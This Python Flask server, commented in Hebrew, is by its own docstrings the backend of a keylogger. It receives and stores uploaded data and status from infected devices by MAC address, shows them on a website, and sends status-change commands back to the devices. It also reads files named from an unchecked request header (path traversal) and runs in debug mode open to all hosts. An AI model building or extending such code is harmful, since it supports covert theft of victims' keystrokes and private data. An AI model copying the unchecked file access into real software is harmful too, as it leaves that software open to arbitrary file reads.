from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os

app = Flask(__name__)
CORS(app)  # מאפשר בקשות מכל דומיין


def write_to_json(name_j, data):
    """פונקציה לשמירת נתונים בקובץ JSON"""
    try:
        file_path = f"{name_j}.json"
        # בדיקה אם הקובץ קיים - טעינת נתונים קיימים או יצירת מילון חדש
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8") as file:
                    data_json = json.load(file)
            except json.JSONDecodeError:
                data_json = {}  # אתחול מחדש במקרה של קובץ פגום
        else:
            data_json = {}

        # עדכון הנתונים החדשים
        data_json.update(data)

        # שמירה מחדש לקובץ
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(data_json, f, ensure_ascii=False, indent=4)
        print(f"✅ נתונים נשמרו בהצלחה לקובץ: {file_path}")
    except Exception as e:
        print(f"❌ שגיאה בשמירת קובץ JSON '{file_path}': {e}")


@app.route('/api/status/update', methods=['POST'])
def status_update():
    """קבלת עדכון סטטוס מהקיי-לוגר ושמירה לפי כתובת MAC"""
    print("=== בקשה מהקיי-לוגר: עדכון סטטוס ===")
    try:
        data = request.get_json()
        if not data:
            print("❌ שגיאה: לא התקבל JSON תקין")
            return jsonify({"error": "Invalid JSON"}), 400

        status = {"mac_address": data}
        write_to_json("device_status", status)
        print(f"📥 נתונים שהתקבלו מהקיי-לוגר: {data}")
        return jsonify({"message": "Success"}), 200
    except Exception as e:
        print(f"❌ שגיאה בעיבוד בקשה מהקיי-לוגר: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/upload', methods=['POST'])
def upload_data():
    """קבלת נתוני דאטא מהקיי-לוגר ושמירה לפי כתובת MAC"""
    print("=== בקשה מהקיי-לוגר: העלאת נתונים ===")
    try:
        data = request.get_json()
        if not data:
            print("❌ שגיאה: לא התקבל JSON תקין")
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = data.get("Mac-Address")
        if not mac_address:
            print("❌ שגיאה: חסרה כתובת MAC בנתונים")
            return jsonify({"error": "Missing macAddress"}), 400

        data = {"mac_address": data}
        write_to_json("device_status", data)
        print(f"📥 נתונים שהתקבלו מהקיי-לוגר: {data}")
        return jsonify({"message": "Success"}), 200
    except json.JSONDecodeError:
        print("❌ שגיאה: קובץ JSON לא תקין")
        return jsonify({"error": "Invalid JSON file"}), 500
    except Exception as e:
        print(f"❌ שגיאה בעיבוד בקשה מהקיי-לוגר: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/api/data/files', methods=['GET'])
def get_data():
    """שליפת נתונים מהשרת עבור הקיי-לוגר לפי כתובת MAC"""
    print("=== בקשה מהקיי-לוגר: שליפת נתונים ===")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        print("❌ שגיאה: חסרה כתובת MAC ב-Headers")
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open(f"{mac_address}.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print(f"📤 נתונים שנשלחו לקיי-לוגר עבור {mac_address}: {data_json}")
        return jsonify(data_json)
    except FileNotFoundError:
        print(f"❌ שגיאה: לא נמצא קובץ עבור MAC {mac_address}")
        return jsonify({"error": f"No data found for MAC: {mac_address}"}), 404
    except json.JSONDecodeError:
        print("❌ שגיאה: קובץ JSON לא תקין")
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/all', methods=['GET'])
def get_status_all():
    """שליפת סטטוסים של כל המכשירים עבור האתר"""
    print("=== בקשה מהאתר: שליפת כל הסטטוסים ===")
    try:
        with open("device_status.json", "r", encoding="utf-8") as file:
            data_json = json.load(file)
            print(f"📤 נתונים שנשלחו לאתר: {data_json}")
        return jsonify(data_json)
    except FileNotFoundError:
        print("❌ שגיאה: קובץ הסטטוסים לא נמצא")
        return jsonify({"error": "No data found"}), 404
    except json.JSONDecodeError:
        print("❌ שגיאה: קובץ JSON לא תקין")
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/check', methods=['GET'])
def check_status():
    """בדיקת סטטוס אחרון של מכשיר מהקיי-לוגר לפי MAC"""
    print("=== בקשה מהקיי-לוגר: בדיקת סטטוס ===")
    mac_address = request.headers.get("mac_address")
    if not mac_address:
        print("❌ שגיאה: חסרה כתובת MAC ב-Headers")
        return jsonify({"error": "Missing mac_address in headers"}), 400

    try:
        with open("change_device_status.json", "r", encoding="utf-8") as file:
            status_json = json.load(file)
            device_status = status_json.get(mac_address)

            if not device_status:
                print(f"ℹ️ אין סטטוס זמין עבור MAC {mac_address}")
                return jsonify({"message": "No status found"}), 404

            print(f"📤 סטטוס שנשלח לקיי-לוגר עבור {mac_address}: {device_status}")
            return jsonify(device_status)
    except FileNotFoundError:
        print("❌ שגיאה: קובץ הסטטוסים לא נמצא")
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        print("❌ שגיאה: קובץ JSON לא תקין")
        return jsonify({"error": "Invalid JSON file"}), 500


@app.route('/api/status/change', methods=['POST'])
def change_status():
    """קבלת עדכון סטטוס מהאתר ושמירה לפי כתובת MAC"""
    print("=== בקשה מהאתר: שינוי סטטוס ===")
    try:
        data = request.get_json()
        if not data:
            print("❌ שגיאה: לא התקבל JSON תקין")
            return jsonify({"error": "Invalid JSON"}), 400

        mac_address = data.get("Mac-Address")
        if not mac_address:
            print("❌ שגיאה: חסרה כתובת MAC בנתונים")
            return jsonify({"error": "Missing macAddress"}), 400

        status = {"mac_address": data}
        write_to_json("change_device_status", status)
        print(f"📥 נתונים שהתקבלו מהאתר: {data}")
        return jsonify({"message": "Success"}), 200
    except FileNotFoundError:
        print("❌ שגיאה: קובץ הסטטוסים לא נמצא")
        return jsonify({"error": "Status file not found"}), 500
    except json.JSONDecodeError:
        print("❌ שגיאה: קובץ JSON לא תקין")
        return jsonify({"error": "Invalid JSON file"}), 500
    except Exception as e:
        print(f"❌ שגיאה בעיבוד בקשה מהאתר: {e}")
        return jsonify({"error": str(e)}), 500


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
